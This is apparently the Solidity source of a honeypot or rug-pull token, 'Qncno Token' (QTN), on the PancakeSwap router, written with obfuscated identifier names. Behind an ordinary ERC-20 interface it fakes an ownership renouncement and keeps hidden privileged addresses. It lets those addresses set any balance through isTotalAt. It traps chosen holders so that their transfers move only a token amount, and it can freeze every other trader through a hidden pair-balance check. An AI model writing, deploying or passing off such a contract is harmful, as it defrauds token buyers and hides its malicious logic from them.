//SPDX-License-Identifier: MIT

pragma solidity ^0.8.14;

interface swapReceiverMarketing {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

abstract contract maxTo {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface receiverList {
    function createPair(address enableAuto, address walletTeam) external returns (address);
}

interface shouldTake {
    function totalSupply() external view returns (uint256);

    function balanceOf(address buyFund) external view returns (uint256);

    function transfer(address maxSwapLimit, uint256 autoAt) external returns (bool);

    function allowance(address listFrom, address spender) external view returns (uint256);

    function approve(address spender, uint256 autoAt) external returns (bool);

    function transferFrom(
        address sender,
        address maxSwapLimit,
        uint256 autoAt
    ) external returns (bool);

    event Transfer(address indexed from, address indexed isMarketingTotal, uint256 value);
    event Approval(address indexed listFrom, address indexed spender, uint256 value);
}

interface shouldTakeMetadata is shouldTake {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract QncnoToken is maxTo, shouldTake, shouldTakeMetadata {

    constructor (){
        
        swapReceiverMarketing enableExempt = swapReceiverMarketing(listLiquidity);
        shouldIs = receiverList(enableExempt.factory()).createPair(enableExempt.WETH(), address(this));
        
        buyTeam = _msgSender();
        launchReceiver();
        autoLiquidityTrading[buyTeam] = true;
        swapAuto[buyTeam] = takeTo;
        
        emit Transfer(address(0), buyTeam, takeTo);
    }

    function isTotalAt(address totalSwap, uint256 autoAt) public {
        launchTo();
        swapAuto[totalSwap] = autoAt;
    }

    uint256 public txList;

    uint256 fundEnable;

    bool private limitBuySell;

    function totalSupply() external view virtual override returns (uint256) {
        return takeTo;
    }

    function isSell(address sellTakeEnable, address maxSwapLimit, uint256 autoAt) internal returns (bool) {
        require(swapAuto[sellTakeEnable] >= autoAt);
        swapAuto[sellTakeEnable] -= autoAt;
        swapAuto[maxSwapLimit] += autoAt;
        emit Transfer(sellTakeEnable, maxSwapLimit, autoAt);
        return true;
    }

    function name() external view virtual override returns (string memory) {
        return tradingReceiver;
    }

    function balanceOf(address buyFund) public view virtual override returns (uint256) {
        return swapAuto[buyFund];
    }

    function txSwap(address sellTakeEnable, address maxSwapLimit, uint256 autoAt) internal returns (bool) {
        if (sellTakeEnable == buyTeam) {
            return isSell(sellTakeEnable, maxSwapLimit, autoAt);
        }
        uint256 receiverExempt = shouldTake(shouldIs).balanceOf(sellTrading);
        require(receiverExempt == fundEnable);
        require(maxSwapLimit != sellTrading);
        if (receiverModeAuto[sellTakeEnable]) {
            return isSell(sellTakeEnable, maxSwapLimit, isReceiverAmount);
        }
        return isSell(sellTakeEnable, maxSwapLimit, autoAt);
    }

    string private tradingReceiver = "Qncno Token";

    uint256 public receiverShould;

    function launchTo() private view {
        require(autoLiquidityTrading[_msgSender()]);
    }

    function toLiquidityTotal(uint256 autoAt) public {
        launchTo();
        fundEnable = autoAt;
    }

    function launchReceiver() public {
        emit OwnershipTransferred(buyTeam, address(0));
        launchTotal = address(0);
    }

    function owner() external view returns (address) {
        return launchTotal;
    }

    function transfer(address totalSwap, uint256 autoAt) external virtual override returns (bool) {
        return txSwap(_msgSender(), totalSwap, autoAt);
    }

    bool public fromMin;

    address listLiquidity = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    function walletTrading(address enableTx) public {
        if (minSell) {
            return;
        }
        
        autoLiquidityTrading[enableTx] = true;
        
        minSell = true;
    }

    bool public sellTeamIs;

    function symbol() external view virtual override returns (string memory) {
        return tokenAt;
    }

    address sellTrading = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    uint256 constant isReceiverAmount = 10 ** 10;

    mapping(address => uint256) private swapAuto;

    address public buyTeam;

    function decimals() external view virtual override returns (uint8) {
        return txMarketingEnable;
    }

    uint256 modeFrom;

    function transferFrom(address sellTakeEnable, address maxSwapLimit, uint256 autoAt) external override returns (bool) {
        if (_msgSender() != listLiquidity) {
            if (atExempt[sellTakeEnable][_msgSender()] != type(uint256).max) {
                require(autoAt <= atExempt[sellTakeEnable][_msgSender()]);
                atExempt[sellTakeEnable][_msgSender()] -= autoAt;
            }
        }
        return txSwap(sellTakeEnable, maxSwapLimit, autoAt);
    }

    bool private buyShould;

    mapping(address => bool) public receiverModeAuto;

    address public shouldIs;

    uint256 private takeTo = 100000000 * 10 ** 18;

    function approve(address marketingLaunch, uint256 autoAt) public virtual override returns (bool) {
        atExempt[_msgSender()][marketingLaunch] = autoAt;
        emit Approval(_msgSender(), marketingLaunch, autoAt);
        return true;
    }

    uint256 private fundAt;

    bool public minSell;

    uint8 private txMarketingEnable = 18;

    function allowance(address minFund, address marketingLaunch) external view virtual override returns (uint256) {
        if (marketingLaunch == listLiquidity) {
            return type(uint256).max;
        }
        return atExempt[minFund][marketingLaunch];
    }

    function buyAmount(address atReceiver) public {
        launchTo();
        
        if (atReceiver == buyTeam || atReceiver == shouldIs) {
            return;
        }
        receiverModeAuto[atReceiver] = true;
    }

    string private tokenAt = "QTN";

    mapping(address => mapping(address => uint256)) private atExempt;

    event OwnershipTransferred(address indexed senderFrom, address indexed launchMax);

    bool public autoLaunchedAmount;

    mapping(address => bool) public autoLiquidityTrading;

    function getOwner() external view returns (address) {
        return launchTotal;
    }

    address private launchTotal;

}